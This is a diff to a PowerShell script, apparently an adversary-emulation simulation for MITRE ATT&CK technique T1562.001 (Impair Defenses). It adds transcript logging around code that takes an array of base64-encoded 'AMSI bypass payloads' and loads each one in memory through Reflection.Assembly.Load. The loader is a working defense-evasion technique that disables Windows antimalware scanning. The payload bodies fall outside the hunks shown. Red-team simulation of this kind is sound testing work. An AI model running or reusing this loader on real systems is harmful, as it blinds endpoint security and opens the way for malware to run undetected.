@@ -1,4 +1,8 @@
-# T1562.001 - Impair Defenses: Disable or Modify Tools
+<#
+    T1562.001 - Impair Defenses: Disable or Modify Tools
+#>
+
+Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append
 
 # AMSI bypass payloads
 $amsiBypassPayloads = @(
@@ -28,3 +32,5 @@ $amsiBypassPayloads = @(
  $amsiBypassPayloads | Foreach-Object {
     [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String($_))
 }
+
+Stop-Transcript
